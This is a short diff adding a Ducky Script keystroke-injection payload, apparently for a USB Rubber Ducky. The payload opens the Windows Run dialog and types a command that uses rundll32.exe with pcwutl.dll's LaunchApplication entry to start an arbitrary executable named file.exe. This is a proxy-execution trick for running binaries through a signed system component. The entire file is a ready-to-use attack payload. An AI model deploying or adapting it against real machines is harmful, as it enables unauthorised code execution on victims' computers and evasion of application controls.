@@ -1,0 +1,6 @@
+REM by JOB
+REM uses rundll32.exe do launch app
+GUI r
+DEFAULT_DELAY 350
+STRING rundll32.exe pcwutl.dll,LaunchApplication file.exe
+ENTER
